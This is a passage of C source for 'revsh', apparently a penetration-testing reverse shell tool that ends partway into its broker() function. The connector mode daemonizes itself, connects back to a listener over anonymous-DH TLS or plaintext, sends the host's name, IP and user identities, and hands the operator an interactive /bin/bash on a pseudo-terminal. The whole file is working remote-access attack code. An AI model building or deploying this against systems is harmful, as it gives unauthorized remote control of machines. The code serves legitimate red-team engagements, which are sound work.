
/*
	XXX

	Fixes:
		* audit / fix error reporting in general. (Done through revsh.c up to broker().)
		* redo comments. Everything there is from the previous incarnation.
		* fix bug w/crash from window resize event mid-stream

	Features:
		* Add support for DHE w/RSA certs
		* Add support for a switch to point to a different rc file.
		* Add known good / tested architectures to the README.

	* Go through with a fine fucking tooth comb. Fucking meditate on this shit!

	And don't forget to update toolbin. :D


	XXX
*/


/*******************************************************************************
 *
 * revsh
 *
 * emptymonkey's reverse shell tool with terminal support
 *
 * 2013-07-17
 *
 *
 * The revsh tool is intended to be used as both a listener and remote client
 * in establishing a remote shell with terminal support. This isn't intended
 * as a replacement for netcat, but rather as a supplementary tool to ease 
 * remote interaction during long engagements.
 *
 *******************************************************************************/


#include "revsh.h"


/*******************************************************************************
 *
 * usage()
 *
 * Input: None.
 * Output: None.
 *
 * Purpose: Educate the user as to the error of their ways.
 *
 ******************************************************************************/
void usage(){
	fprintf(stderr, "\nusage: %s [-l [-e ENV_ARGS] [-s SHELL]] ADDRESS PORT\n", \
			program_invocation_short_name);
	fprintf(stderr, "\n\t-l: Setup a listener.\n");
	fprintf(stderr, "\t-e ENV_ARGS: Export ENV_ARGS to the remote shell. (Defaults are \"TERM\" and \"LANG\".)\n");
	fprintf(stderr, "\t-s SHELL: Invoke SHELL as the remote shell. (Default is /bin/bash.)\n");
	fprintf(stderr, "\n\tNote: '-e' and '-s' only work with a listener.\n\n");

	exit(-1);
}



int main(int argc, char **argv){

	int i, retval, err_flag;

	int opt;
	char *shell = NULL;
	char *env_string = NULL;

	char *pty_name;
	int pty_master, pty_slave;
	struct termios saved_termios_attrs, new_termios_attrs;

	char **exec_argv;
	char **exec_envp;
	char **tmp_vector;

	int buff_len, tmp_len;
	char *buff_head, *buff_tail;
	char *tmp_ptr;

	int io_bytes;

	struct winsize tty_winsize;

	char tmp_char;

	struct remote_io_helper io;

  BIO *accept;

	struct passwd *passwd_entry;


	io.listener = 0;
	io.encryption = ADH;

	while((opt = getopt(argc, argv, "pls:e:")) != -1){
		switch(opt){

			case 'p':
				io.encryption = PLAINTEXT;
				break;

			case 'l':
				io.listener = 1;
				break;

			case 'e':
				env_string = optarg;
				break;

			case 's':
				shell = optarg;
				break;

			default:
				usage();
		}
	}


	if((argc - optind) != 2){
		usage();
	}


	buff_len = getpagesize();
	if((buff_head = (char *) calloc(buff_len, sizeof(char))) == NULL){
		error(-1, errno, "calloc(%d, %d)", buff_len, (int) sizeof(char));
	}

	tmp_len = strlen(argv[optind]);
	memcpy(buff_head, argv[optind], tmp_len);
	buff_head[tmp_len++] = ':';
	strcat(buff_head, argv[optind + 1]);

	SSL_library_init();
  SSL_load_error_strings();

	if(io.encryption){
		io.remote_read = &remote_read_encrypted;
		io.remote_write = &remote_write_encrypted;
	}else{
		io.remote_read = &remote_read_plaintext;
		io.remote_write = &remote_write_plaintext;
	}

	/*
	 * Listener:
	 * - Open a socket.
	 * - Listen for a connection.
	 * - Send initial shell data.
	 * - Send initial environment data.
	 * - Send initial termios data.
	 * - Set local terminal to raw. 
	 * - Enter broker() for data brokering.
	 * - Reset local term.
	 * - Exit.
	 */
	if(io.listener){

		printf("Listening...");
		fflush(stdout);

		if(io.encryption){

			if((io.ctx = SSL_CTX_new(TLSv1_server_method())) == NULL){
				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_server_method()): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if((io.dh = get_dh2048()) == NULL){
				fprintf(stderr, "%s: %d: get_dh2048(): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(!SSL_CTX_set_tmp_dh(io.ctx, io.dh)){
				fprintf(stderr, "%s: %d: SSL_CTX_set_tmp_dh(%lx, %lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, (unsigned long) io.dh, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}

			if(SSL_CTX_set_cipher_list(io.ctx, ADH_CIPHER) != 1){
				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, ADH_CIPHER, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}
		}

		if((accept = BIO_new_accept(buff_head)) == NULL){
			fprintf(stderr, "%s: %d: BIO_new_accept(%s): %s\n", \
						program_invocation_short_name, io.listener, buff_head, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_set_bind_mode(accept, BIO_BIND_REUSEADDR) <= 0){
			fprintf(stderr, "%s: %d: BIO_set_bind_mode(%lx, BIO_BIND_REUSEADDR): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(BIO_do_accept(accept) <= 0){
			fprintf(stderr, "%s: %d: BIO_do_accept(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if((io.connect = BIO_pop(accept)) == NULL){
			fprintf(stderr, "%s: %d: BIO_pop(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) accept, strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		BIO_free(accept);

		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
			ERR_print_errors_fp(stderr);
			exit(-1);
		}

		if(io.encryption){
			if(!(io.ssl = SSL_new(io.ctx))){
				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1); 
			}

			SSL_set_bio(io.ssl, io.connect, io.connect);

			if(SSL_accept(io.ssl) < 1){
				fprintf(stderr, "%s: %d: SSL_accept(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
				exit(-1);
			}
		}

		printf("Initializing...");
		fflush(stdout);

		// - Send initial shell data.
		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;
		if(shell){
			tmp_len = strlen(shell);
			memcpy(buff_tail, shell, tmp_len);
		}else{
			tmp_len = strlen(DEFAULT_SHELL);
			memcpy(buff_tail, DEFAULT_SHELL, tmp_len);
		}
		buff_tail += tmp_len;

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			print_error(&io, "%s: %d: Environment string too long.\n", program_invocation_short_name, io.listener);
			exit(-1);
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != (buff_tail - buff_head)){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, buff_len);
			exit(-1);
		}

		// - Send initial environment data.
		if(!env_string){
			tmp_len = strlen(DEFAULT_ENV);
			if((env_string = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
				print_error(&io, "%s: %d: calloc(strlen(%d, %d)): %s\n", \
						program_invocation_short_name, io.listener, \
						tmp_len + 1, (int) sizeof(char), strerror(errno));
				exit(-1);
			}

			memcpy(env_string, DEFAULT_ENV, tmp_len);
		}

		tmp_ptr = env_string;
		while((tmp_ptr = strchr(tmp_ptr, ','))){
			*tmp_ptr = ' ';
		}

		if((exec_envp = string_to_vector(env_string)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\n", \
					program_invocation_short_name, io.listener, \
					env_string, strerror(errno));
			exit(-1);
		}

		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		for(i = 0; exec_envp[i]; i++){

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Environment string too long.\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}else if(buff_tail != (buff_head + 1)){
				*(buff_tail++) = ' ';
			}

			tmp_len = strlen(exec_envp[i]);
			memcpy(buff_tail, exec_envp[i], tmp_len);

			buff_tail += tmp_len;

			*(buff_tail++) = '=';

			if((tmp_ptr = getenv(exec_envp[i])) == NULL){
				fprintf(stderr, "%s: No such environment variable \"%s\". Ignoring.\n", \
						program_invocation_short_name, exec_envp[i]);
			}else{
				tmp_len = strlen(tmp_ptr);
				memcpy(buff_tail, tmp_ptr, tmp_len);
				buff_tail += tmp_len;
			}
		}

		*(buff_tail++) = (char) ST;

		if((buff_tail - buff_head) >= buff_len){
			print_error(&io, "%s: %d: Environment string too long.\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != (buff_tail - buff_head)){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, buff_len);
			exit(-1);
		}


		// - Send initial termios data.
		if((retval = ioctl(STDIN_FILENO, TIOCGWINSZ, &tty_winsize)) == -1){
			print_error(&io, "%s: %d: ioctl(STDIN_FILENO, TIOCGWINSZ, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &tty_winsize, strerror(errno));
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;
		*(buff_tail++) = (char) APC;

		if((retval = snprintf(buff_tail, buff_len - 2, "%hd %hd", \
						tty_winsize.ws_row, tty_winsize.ws_col)) < 0){
			print_error(&io, "%s: %d: snprintf(buff_head, buff_len, \"%%hd %%hd\", %hd, %hd): %s\n", \
					program_invocation_short_name, io.listener, \
					tty_winsize.ws_row, tty_winsize.ws_col, strerror(errno));
			exit(-1);
		}

		buff_tail += retval;
		*(buff_tail++) = (char) ST;

		tmp_len = strlen(buff_head);
		if((io_bytes = io.remote_write(&io, buff_head, tmp_len)) == -1){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len, strerror(errno));
			exit(-1);
		}

		if(io_bytes != tmp_len){
			print_error(&io, "%s: %d: io.remote_write(%lx, %lx, %d): Unable to write entire string.\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) buff_head, tmp_len);
			exit(-1);
		}

		// - Set local terminal to raw. 
		if((retval = tcgetattr(STDIN_FILENO, &saved_termios_attrs)) == -1){
			print_error(&io, "%s: %d: tcgetattr(STDIN_FILENO, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &saved_termios_attrs, strerror(errno));
			exit(-1);
		}

		memcpy(&new_termios_attrs, &saved_termios_attrs, sizeof(struct termios));

		new_termios_attrs.c_lflag &= ~(ECHO|ICANON|IEXTEN|ISIG);
		new_termios_attrs.c_iflag &= ~(BRKINT|ICRNL|INPCK|ISTRIP|IXON);
		new_termios_attrs.c_cflag &= ~(CSIZE|PARENB);
		new_termios_attrs.c_cflag |= CS8;
		new_termios_attrs.c_oflag &= ~(OPOST);

		new_termios_attrs.c_cc[VMIN] = 1;
		new_termios_attrs.c_cc[VTIME] = 0;

		if((retval = tcsetattr(STDIN_FILENO, TCSANOW, &new_termios_attrs)) == -1){
			print_error(&io, "%s: %d: tcsetattr(STDIN_FILENO, TCSANOW, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &new_termios_attrs, strerror(errno));
			exit(-1);
		}	

		printf("\tDone!\r\n");
		fflush(stdout);

		io.local_fd = STDIN_FILENO;

		errno = 0;
		// - Enter broker() for data brokering.
		if((retval = broker(&io) == -1)){
			print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
					program_invocation_short_name, io.listener, (unsigned long) &io,
					strerror(errno));
		}

		err_flag = 0;
		if(errno == ECONNRESET){
			err_flag = errno;
		}

		// - Reset local term.
		tcsetattr(STDIN_FILENO, TCSANOW, &saved_termios_attrs);

		// - Exit.
		if(!err_flag){
			printf("Good-bye!\n");

		}else{
			while((retval = io.remote_read(&io, buff_head, buff_len)) > 0){
				write(STDERR_FILENO, buff_head, retval);
			}
		}
		if(io.encryption){
			SSL_shutdown(io.ssl);
			SSL_free(io.ssl);
			SSL_CTX_free(io.ctx);
		}else{
			BIO_free(io.connect);
		}

		return(0);

	}else{

		/*
		 * Connector: 
		 * - Become a daemon.
		 * - Open a network connection back to a listener.
		 * - Check for usage and exit, if needed. 
		 * - Receive and set the shell.
		 * - Receive and set the initial environment.
		 * - Receive and set the initial termios.
		 * - Create a pseudo-terminal (pty).
		 * - Send basic information back to the listener about the connecting host.
		 * - Fork a child to run the shell.
		 * - Parent: Enter the broker() and broker data.
		 * - Child: Initialize file descriptors.
		 * - Child: Set the pty as controlling.
		 * - Child: Call execve() to invoke a shell.
		 */


		// - Become a daemon.
		umask(0);


		retval = fork();

#ifndef DEBUG

		if(retval == -1){
			error(-1, errno, "fork()");
		}else if(retval){
			exit(0);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		}

		if((retval = chdir("/")) == -1){
			error(-1, errno, "chdir(\"/\")");
		}

#endif

		if(io.encryption){

			if((io.ctx = SSL_CTX_new(TLSv1_client_method())) == NULL){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_new(TLSv1_client_method()): %s\n", \
						program_invocation_short_name, io.listener, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			if(SSL_CTX_set_cipher_list(io.ctx, ADH_CIPHER) != 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_CTX_set_cipher_list(%lx, %s): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, ADH_CIPHER, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}
		}

		if((io.connect = BIO_new_connect(buff_head)) == NULL){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_new_connect(%s): %s\n", \
					program_invocation_short_name, io.listener, buff_head, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(BIO_do_connect(io.connect) <= 0){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_do_connect(%lx): %s\n", \
					program_invocation_short_name, io.listener, (unsigned long) io.connect, strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(BIO_get_fd(io.connect, &(io.remote_fd)) < 0){
#ifndef DEBUG
			fprintf(stderr, "%s: %d: BIO_get_fd(%lx, %lx): %s\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) io.connect, (unsigned long) &(io.remote_fd), strerror(errno));
			ERR_print_errors_fp(stderr);
#endif
			exit(-1);
		}

		if(io.encryption > PLAINTEXT){

			if(!(io.ssl = SSL_new(io.ctx))){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_new(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ctx, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}

			SSL_set_bio(io.ssl, io.connect, io.connect);

			if((retval = SSL_connect(io.ssl)) < 1){
#ifndef DEBUG
				fprintf(stderr, "%s: %d: SSL_connect(%lx): %s\n", \
						program_invocation_short_name, io.listener, (unsigned long) io.ssl, strerror(errno));
				ERR_print_errors_fp(stderr);
#endif
				exit(-1);
			}
		}

		// - Check for usage and exit, if needed. 
		// We do this after the network connect so the error
		// reporting gets sent back to the listener, if possible.
		if(shell || env_string){
			print_error(&io, "%s: %d: remote usage error: Only listeners can invoke -s or -e!\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		// - Receive and set the shell.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, %d): %s\r\n", \
					program_invocation_short_name, io.listener, (unsigned long) &io, (unsigned long) &tmp_char, 1, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: shell\r\n", program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Shell string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		tmp_len = strlen(buff_head);
		if((shell = (char *) calloc(tmp_len + 1, sizeof(char))) == NULL){
			print_error(&io, "%s: %d: calloc(%d, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					tmp_len + 1, (int) sizeof(char), strerror(errno));
			exit(-1);
		}
		memcpy(shell, buff_head, tmp_len);


		// - Receive and set the initial environment.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: environment\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: Environment string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		if((exec_envp = string_to_vector(buff_head)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					buff_head, strerror(errno));
			exit(-1);
		}

		// - Receive and set the initial termios.
		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		if(tmp_char != (char) APC){
			print_error(&io, "%s: %d: invalid initialization: termios\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		memset(buff_head, 0, buff_len);
		buff_tail = buff_head;

		if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
			print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
			exit(-1);
		}

		while(tmp_char != (char) ST){
			*(buff_tail++) = tmp_char;

			if((buff_tail - buff_head) >= buff_len){
				print_error(&io, "%s: %d: termios string too long.\r\n", \
						program_invocation_short_name, io.listener);
				exit(-1);
			}

			if((io_bytes = io.remote_read(&io, &tmp_char, 1)) == -1){
				print_error(&io, "%s: %d: io.remote_read(%lx, %lx, 1): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, (unsigned long) &tmp_char, strerror(errno));
				exit(-1);
			}
		}

		if((tmp_vector = string_to_vector(buff_head)) == NULL){
			print_error(&io, "%s: %d: string_to_vector(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(tmp_vector[0] == NULL){
			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_row\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		errno = 0;
		tty_winsize.ws_row = strtol(tmp_vector[0], NULL, 10);
		if(errno){
			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(tmp_vector[1] == NULL){
			print_error(&io, "%s: %d: invalid initialization: tty_winsize.ws_col\r\n", \
					program_invocation_short_name, io.listener);
			exit(-1);
		}

		errno = 0;
		tty_winsize.ws_col = strtol(tmp_vector[1], NULL, 10);
		if(errno){
			print_error(&io, "%s: %d: strtol(%s): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		// - Create a pseudo-terminal (pty).
		if((pty_master = posix_openpt(O_RDWR|O_NOCTTY)) == -1){
			print_error(&io, "%s: %d: posix_openpt(O_RDWR|O_NOCTTY): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if((retval = grantpt(pty_master)) == -1){
			print_error(&io, "%s: %d: grantpt(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((retval = unlockpt(pty_master)) == -1){
			print_error(&io, "%s: %d: unlockpt(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((retval = ioctl(pty_master, TIOCSWINSZ, &tty_winsize)) == -1){
			print_error(&io, "%s: %d: ioctl(%d, %d, %lx): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, TIOCGWINSZ, (unsigned long) &tty_winsize, strerror(errno));
			exit(-1);
		}

		if((pty_name = ptsname(pty_master)) == NULL){
			print_error(&io, "%s: %d: ptsname(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}

		if((pty_slave = open(pty_name, O_RDWR|O_NOCTTY)) == -1){
			print_error(&io, "%s: %d: open(%s, O_RDWR|O_NOCTTY): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_name, strerror(errno));
			exit(-1);
		}

		// - Send basic information back to the listener about the connecting host.
		//   (e.g. hostname, ip address, username)
		memset(buff_head, 0, buff_len);
		if((retval = gethostname(buff_head, buff_len - 1)) == -1){
			print_error(&io, "%s: %d: gethostname(%lx, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					(unsigned long) buff_head, buff_len - 1, strerror(errno));
			exit(-1);
		}

		remote_printf(&io, "################################\r\n");
		remote_printf(&io, "# hostname: %s\r\n", buff_head);

		io.ip_addr = BIO_get_conn_ip(io.connect);
		remote_printf(&io, "# ip address: %d.%d.%d.%d\r\n", io.ip_addr[0], io.ip_addr[1], io.ip_addr[2], io.ip_addr[3]);

		passwd_entry = getpwuid(getuid());
		remote_printf(&io, "# real user: %s\r\n", passwd_entry->pw_name);

		passwd_entry = getpwuid(geteuid());
		remote_printf(&io, "# effective user: %s\r\n", passwd_entry->pw_name);
		remote_printf(&io, "################################\r\n");


		if((retval = close(STDIN_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDIN_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if((retval = close(STDOUT_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDOUT_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if((retval = close(STDERR_FILENO)) == -1){
			print_error(&io, "%s: %d: close(STDERR_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}


		// - Fork a child to run the shell.
		retval = fork();

		if(retval == -1){
			print_error(&io, "%s: %d: fork(): %s\r\n", \
					program_invocation_short_name, io.listener, \
					strerror(errno));
			exit(-1);
		}

		if(retval){

			// - Parent: Enter the broker() and broker data.
			if((retval = close(pty_slave)) == -1){
				print_error(&io, "%s: %d: close(%d): %s\r\n", \
						program_invocation_short_name, io.listener, \
						pty_slave, strerror(errno));
				exit(-1);
			}

			io.local_fd = pty_master;

			retval = broker(&io);

			if((retval == -1)){
				print_error(&io, "%s: %d: broker(%lx): %s\r\n", \
						program_invocation_short_name, io.listener, \
						(unsigned long) &io, strerror(errno));
				exit(-1);
			}

			if(io.encryption){
				SSL_shutdown(io.ssl);
				SSL_free(io.ssl);
				SSL_CTX_free(io.ctx);
			}

			return(0);
		}

		// - Child: Initialize file descriptors.
		if((retval = close(pty_master)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_master, strerror(errno));
			exit(-1);
		}
		if((retval = dup2(pty_slave, STDIN_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, STDIN_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = dup2(pty_slave, STDOUT_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, STDOUT_FILENO): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, strerror(errno));
			exit(-1);
		}

		if((retval = dup2(pty_slave, STDERR_FILENO)) == -1){
			print_error(&io, "%s: %d: dup2(%d, %d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					pty_slave, STDERR_FILENO, strerror(errno));
			exit(-1);
		}

		if((retval = close(io.remote_fd)) == -1){
			print_error(&io, "%s: %d: close(%d): %s\r\n", \
					program_invocation_short_name, io.listener, \
					io.remote_fd, strerror(errno));
			exit(-1);
		}

		if((retval = close(pty_slave)) == -1){
			error(-1, errno, "close(%d)", pty_slave);
		}

		if((retval = setsid()) == -1){
			error(-1, errno, "setsid()");
		} 

		// - Child: Set the pty as controlling.
		if((retval = ioctl(STDIN_FILENO, TIOCSCTTY, 1)) == -1){
			error(-1, errno, "ioctl(STDIN_FILENO, TIOCSCTTY, 1)");
		}

		// - Child: Call execve() to invoke a shell.
		errno = 0;
		if((exec_argv = string_to_vector(shell)) == NULL){
			error(-1, errno, "string_to_vector(%s)", shell);
		}

		execve(exec_argv[0], exec_argv, exec_envp);
		error(-1, errno, "execve(%s, %lx, NULL): shouldn't be here.", \
				exec_argv[0], (unsigned long) exec_argv);

	}

	return(-1);
}


/*******************************************************************************
 *
 * broker()
 *
 * Input: Two file descriptors. Also, an indication of whether or not we are a
 *  listener.
 * Output: 0 for EOF, -1 for errors.
 *
 * Purpose: Broker data between the two file descriptors. Also, handle some 
 *  signal events (e.g. SIGWINCH) with in-band signalling.
 *
 ******************************************************************************/
int broker(struct remote_io_helper *io){

	int retval = -1;
	fd_set fd_select;
	int io_bytes, fd_max;

	int buff_len;
	char *buff_head = NULL;
	char *buff_tail = NULL;

	// APC (0x9f) and ST (0x9c) are 8 bit control characters. These pointers will
	// point to their location in a string, if found.
	// Using APC here as start of an in-band signalling event, and ST to mark
	// the end.
	// 
	// EDIT: Added UTF8_HIGH to the APC and ST characters to ensure the in-band signalling can coexist with utf8 data.
	//	We don't bother with the UTF8_HIGH parts before the broker() because they don't intermingle with user 
	//	generated data until now.
	char *event_ptr = NULL;

	struct sigaction act;
	int current_sig;

	struct winsize tty_winsize;
	int winsize_buff_len;
	char *winsize_buff_head, *winsize_buff_tail;
	char **winsize_vec;
	int sig_pid;

	char tmp_char;
	int tmp_len;

	int state_counter;

	char *rc_file_head, *rc_file_tail;
	int rc_file_fd;

	int fcntl_flags;

	int ssl_bytes_pending = 0;


	if(io->listener){
		memset(&act, 0, sizeof(act));
		act.sa_handler = signal_handler;

		if((retval = sigaction(SIGWINCH, &act, NULL)) == -1){
			fprintf(stderr, "%s: %d: sigaction(%d, %lx, %p): %s\r\n", \
					program_invocation_short_name, io->listener, \
					SIGWINCH, (unsigned long) &act, NULL, strerror(errno));
			goto CLEAN_UP;
		}
	}

	// One buffer for reads + writes.
	buff_len = getpagesize();
	buff_head = (char *) calloc(buff_len, sizeof(char));

	// And one buffer for dealing with serialization and transmission / receipt
	// of a struct winsize. This probably only needs to be 14 chars long.
	// 2 control chars + 1 space + (2 * string length of winsize members).
	// winsize members are unsigned shorts on my dev platform.
	// There are four members total, but the second two are ignored.
	winsize_buff_len = WINSIZE_BUFF_LEN;
	winsize_buff_head = (char *) calloc(winsize_buff_len, sizeof(char));


	// Let's add support for .revsh/rc files here! :D
	if(io->listener){

